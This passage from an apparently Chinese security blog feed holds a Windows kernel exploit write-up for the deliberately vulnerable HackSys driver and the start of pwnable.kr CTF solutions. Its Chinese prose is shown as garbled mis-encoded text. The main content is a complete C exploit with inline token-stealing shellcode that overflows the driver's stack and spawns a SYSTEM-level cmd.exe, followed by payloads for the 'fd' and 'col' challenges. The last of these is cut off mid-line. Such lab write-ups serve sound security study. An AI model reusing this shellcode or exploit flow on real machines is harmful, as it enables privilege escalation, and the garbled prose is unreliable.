è¿‡ç¨‹</h4><p>ä¸‹é¢å°±å¯ä»¥å¼€å§‹å…ˆå»ç¡®å®šbofçš„é•¿åº¦äº†ï¼Œä½¿ç”¨kaliä¸‹çš„pattern_createå’Œpattern_offsetå·¥å…·ï¼Œä»–ä»¬çš„è·¯å¾„åœ¨kali2ä¸‹æ˜¯ï¼š<code>/usr/share/metasploit-framework/tools/exploit</code>ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/p_create.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/p_create.png"></a><br>ä¿®æ”¹ä¸Šè¿°æºç éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *data = <span class="string">&quot;result of ./pattern_create.rb -l 3506&quot;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(lpInBuffer,data,nInBufferSize);</span><br></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘demo_bofï¼Œç„¶åè¿è¡Œã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/crash.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/crash.png"></a><br>å´©æºƒäº†ï¼Œeipè¢«è¦†ç›–æˆäº†junkå­—ç¬¦ï¼Œç„¶åç¡®å®šåç§»ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/offset.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/offset.png"></a><br>payloadåº”è¯¥æ˜¯ï¼š<code>2080 bytes</code> + <code>sc addr</code></p><p>ç»å…¸çš„TokenStealingShellcodeå¦‚ä¸‹ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/tokenstealing.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/tokenstealing.png"></a></p><p>æ„é€ å‡ºæ¥çš„exploitå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET  0x124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET 0x044</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET0x084</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET0x088</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET0x0c8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID      0x004</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">TokenStealingShellcodeWin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">pushad</span><br><span class="line"></span><br><span class="line">mov eax,fs:[KTHREAD_OFFSET]</span><br><span class="line">mov eax,[eax + EPROCESS_OFFSET]</span><br><span class="line"></span><br><span class="line">mov ecx,eax</span><br><span class="line">mov ebx,[eax + TOKEN_OFFSET]</span><br><span class="line">mov edx,SYSTEM_PID</span><br><span class="line"></span><br><span class="line">SearchSystemPID:</span><br><span class="line">mov eax,[eax + FLINK_OFFSET]</span><br><span class="line">sub eax,FLINK_OFFSET</span><br><span class="line">cmp [eax+PID_OFFSET],edx</span><br><span class="line">jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">mov edx,[eax + TOKEN_OFFSET]</span><br><span class="line">mov [ecx + TOKEN_OFFSET],edx</span><br><span class="line"></span><br><span class="line">popad</span><br><span class="line">        </span><br><span class="line">;recovery</span><br><span class="line"><span class="keyword">xor</span> eax,eax ;<span class="built_in">set</span> NTSTATUS SUCEESS</span><br><span class="line">add esp,<span class="number">12</span>  ;fix <span class="built_in">stack</span></span><br><span class="line">pop ebp</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc,_TCHAR* argv[])&#123;</span><br><span class="line"></span><br><span class="line">DWORD lpBytesReturned;</span><br><span class="line">PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//PULONG lpInBuffer = NULL;</span></span><br><span class="line">LPCSTR lpDeviceName = (LPCSTR) <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line"><span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Getting the device handle\r\n&quot;</span>);</span><br><span class="line">HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to get device handle : (0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Got the device Handle : 0x%X\r\n&quot;</span>, hDriver);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating Memory For Input Buffer\r\n&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if (!lpInBuffer) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;HeapAlloc failed :(0x%X\r\n)&quot;,GetLastError());</span></span><br><span class="line"><span class="comment">return 1;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf(&quot;Input buffer allocated as 0x%X bytes.\r\n&quot;,nInBufferSize);</span></span><br><span class="line"><span class="comment">printf(&quot;Input buffer address : 0x%p\r\n&quot;,lpInBuffer);</span></span><br><span class="line"><span class="comment">printf(&quot;Filling buffer with A&#x27;s\r\n&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[*]Payload is at : %p\n&quot;</span>, TokenStealingShellcodeWin);</span><br><span class="line"><span class="comment">//junk&#x27;s length is 2080</span></span><br><span class="line">CHAR *chBuffer = (CHAR*)<span class="built_in">malloc</span>(<span class="number">2084</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[*]Buffer is at : %p\n&quot;</span>, &amp;chBuffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(chBuffer, <span class="number">0x41</span>, <span class="number">2048</span>);</span><br><span class="line"><span class="built_in">memset</span>(chBuffer + <span class="number">2048</span>, <span class="number">0x42</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="comment">//set eip</span></span><br><span class="line">chBuffer[<span class="number">2080</span>] = (DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x000000FF</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">1</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x0000FF00</span>) &gt;&gt;<span class="number">8</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">2</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">chBuffer[<span class="number">2080</span> + <span class="number">3</span>] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Send IOCTL request\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">DeviceIoControl(hDriver,</span><br><span class="line">HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">chBuffer,</span><br><span class="line"><span class="number">2084</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;lpBytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//get shell</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;IOCTL request completed,cleaning up da heap.\r\n&quot;</span>);</span><br><span class="line"><span class="comment">//HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);</span></span><br><span class="line">CloseHandle(hDriver);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘åè¿è¡Œexploitç¨‹åºã€‚<br>å› ä¸ºæˆ‘è¿™ä¸ªxpåœ¨å®‰è£…çš„æ—¶å€™æ²¡æœ‰è£…whoamiå·¥å…·ï¼Œæ‰€ä»¥åœ¨çœ‹æˆ‘ä½¿ç”¨äº†ProcessExploreræ¥çœ‹æ–°å¯åŠ¨çš„cmdçš„æƒé™ä¿¡æ¯ã€‚<br>åœ¨è¿è¡Œexploitä¹‹å‰<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/before_exp.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/before_exp.png"></a><br>è¿è¡Œexploit<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/after_exp.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/after_exp.png"></a><br>æˆåŠŸæ‹¿åˆ°æœ€é«˜æƒé™ã€‚</p><h4 id="0x05ï¼šå…³äºshell-codeçš„åˆ†æ"><a href="#0x05ï¼šå…³äºshell-codeçš„åˆ†æ" class="headerlink" title="0x05ï¼šå…³äºshell codeçš„åˆ†æ"></a>0x05ï¼šå…³äºshell codeçš„åˆ†æ</h4><p>æƒ³è¦åˆ†æshellcodeæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œç›´æ¥åœ¨å®ƒæœ€å‰é¢åŠ ä¸€ä¸ª<code>int 3</code>ç„¶åé‡æ–°ç¼–è¯‘ï¼Œå†æŠŠexploitè·‘èµ·æ¥ï¼Œwindbgé‡Œåˆ†æå°±å¥½äº†ã€‚<br>å‰é¢è¯´åˆ°è¿™ä¸ªè·å–tokenè¦æ‰¾åˆ°EPROCESSç»“æ„ã€‚</p><p><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/process.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/process.png"></a></p><p>ç„¶è€Œwindowsæœ‰ä¸ªAPI <code>PsGetCurrentProcess</code>å¯ä»¥è·å–åŒ…å«EPROCESSç»“æ„çš„processå¯¹è±¡ã€‚<br>åæ±‡ç¼–çœ‹ä¸‹è¿™ä¸ªAPIçš„å®ç°ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/getprocess.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/getprocess.png"></a></p><p>ä½¿ç”¨<code>dt -b -v _EPROCESS</code>æŸ¥çœ‹<code>EPROCESS</code>ç»“æ„ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/EPROCESS.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/EPROCESS.png"></a><br>ä¹‹å‰åœ¨shellcodeä¸­çœ‹åˆ°çš„ä¸€äº›æ•°æ®çš„å®šä¹‰ï¼Œéƒ½å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚<br>ä¸‹é¢æ¥åˆ†ææˆ‘ä»¬è¿™æ®µshellcodeçš„å·¥ä½œã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode.png"></a><br>å•æ­¥<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode1.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode1.png"></a><br>è‡³æ­¤ï¼Œè·å¾—å½“å‰è¿›ç¨‹çš„EPROCESSç»“æ„æŒ‡é’ˆä¿å­˜åœ¨ecxå¾…ç”¨ã€‚<br>ä¸‹é¢è¿›å…¥å¾ªç¯å¯»æ‰¾SYSTEM_PID,ç„¶åè·å–å…¶tokenï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode2.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode2.png"></a><br>è¿™ä¸ªå¾ªç¯è·‘çš„æ¬¡æ•°æŒºå¤šï¼Œæˆ‘ç›´æ¥ä¸‹æ–­è·³å‡ºå¾ªç¯æ¥ç€åˆ†æï¼Œè¿™é‡Œæ¥åˆ°tokenæ›¿æ¢çš„éƒ¨åˆ†ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode3.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/shellcode3.png"></a><br>ä¹‹åç›´æ¥popadå¼¹å‡ºä¹‹å‰ä¿å­˜çš„å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åå›åˆ°åŸæ¥çš„ä»£ç å»æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„è¿›ç¨‹(demo_bof)çš„tokenå·²ç»æ˜¯systemè¿›ç¨‹çš„tokenäº†ï¼Œè¿™ä¸ªæ—¶å€™ç›´æ¥èµ·ä¸€ä¸ªcmdï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæœ€é«˜æƒé™çš„shelläº†ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/back.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/back.png"></a><br>è¿™ä¸ªæ—¶å€™F5ï¼Œè™šæ‹Ÿæœºé‚£è¾¹å°±å·²ç»èµ·æ¥ä¸€ä¸ªsystem32çš„cmdäº†ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/getit.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/getit.png"></a></p><h4 id="0x06-å‚è€ƒä¸å¼•ç”¨"><a href="#0x06-å‚è€ƒä¸å¼•ç”¨" class="headerlink" title="0x06: å‚è€ƒä¸å¼•ç”¨"></a>0x06: å‚è€ƒä¸å¼•ç”¨</h4><p><a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a><br>lhs0kå¸ˆå‚…çš„å¸®åŠ©</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnableåˆ·é¢˜æ—¥è®° ç¬¬ä¸€é˜¶æ¢¯éƒ¨åˆ†</title>
      <link href="pwnable%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0.html"/>
      <url>pwnable%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h1><p>è¿™æ˜¯ä¸€ä¸ªæ£’å­å¼„çš„CTFé¢˜åº“ï¼Œä¸»è¦é’ˆå¯¹çš„æ˜¯pwnçš„è¿™ä¸ªä¹ˆä¸€ä¸ªé¢˜å‹ï¼Œç½‘ç«™çš„åœ°å€æ˜¯ <a href="http://pwnable.kr/">http://pwnable.kr/</a>ã€‚ä¸ä¹‹ç›¸å¯¹çš„è¿˜æœ‰ä¸€ä¸ªé€†å‘çš„é¢˜åº“ï¼Œä¹Ÿæ˜¯æ£’å­å‡ºçš„ï¼Œè¿™é‡Œä¹Ÿé¡ºä¾¿æä¸€ä¸‹ã€‚<br>æ€»ä½“å¤§æ¦‚èƒ½åˆ†ä¸ºå››ä¸ªå±‚æ¬¡å§ï¼Œç¬¬ä¸€ä¸ªå±‚æ¬¡é¢˜ç›®ä¹Ÿæ¯”è¾ƒå¤šï¼Œä½†æ˜¯ä¹Ÿæ¯”è¾ƒåŸºç¡€ã€‚</p><h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p><strong>æ—¶é—´</strong> 2017-01-17  æ„Ÿè§‰æŸäº›äº‹æƒ…å¾ˆä¸é¡ºå¿ƒï¼Œæ‰€ä»¥åˆ·é¢˜æ¥äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢çš„å‡ ä¸ªé¢˜å¥½åƒéƒ½ç»™äº†æºä»£ç ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªé¢˜çš„æºä»£ç ã€‚<br>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œ**atoi **è¿™ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´å‹æ•°çš„ä¸€ä¸ªå‡½æ•°ï¼Œè€Œ0x1234çš„æ•´å‹æ˜¯4660<br>ä»ä»£ç æ¥çœ‹ï¼Œ<br>ç›®æ ‡ï¼šæ‰§è¡Œsystem(â€œ/bin/cat flagâ€);<br>åˆ™ï¼šstrcmp(â€œLETMEWIN\nâ€, buf) == 0<br>åˆ™ï¼šbuf = â€œLETMEWIN\nâ€<br>åˆ™ï¼šread(fd, buf, 32)å°†bufè®¾ä¸ºâ€LETMEWIN\nâ€<br>fd == 0ä¸ºæ ‡å‡†è¾“å…¥<br>fd == 1ä¸ºæ ‡å‡†è¾“å‡º<br>fd == 2ä¸ºæ ‡å‡†é”™è¯¯è¾“å‡º<br>è€Œ0x1234 = 4660 æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥ä¸º 4660ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿fd == 0ï¼Œç„¶åä»ç»ˆç«¯è¾“å…¥LETMEWINåå›è½¦ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line"></span><br><span class="line">good job :)</span><br><span class="line">flag:  mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h1 id="col"><a href="#col" class="headerlink" title="col"></a>col</h1><p>æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥20å­—èŠ‚ï¼Œæ¯4å­—èŠ‚ä½œä¸ºä¸€ä¸ªæ•´æ•°ï¼Œç›¸åŠ åå¾—åˆ° 0x21DD09ECå³å¯ã€‚ç”±äºæ˜¯é€šè¿‡strlenåˆ¤æ–­é•¿åº¦ï¼Œæ‰€ä»¥ä¸èƒ½æœ‰0x00å‡ºç°ï¼Œå°†0x21DD09ECæ‹†åˆ†æˆ5ä¸ªæ•´æ•°ç›¸åŠ ï¼ˆ0x01010101 + 0x01010101 + 0x01010101 + 0x01010101 + 0x1DD905E8ï¼‰<br>æ‰€ä»¥ expä¸º:    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">&#x27;print &quot;\xE8\x05\xD9\x1D&quot; + 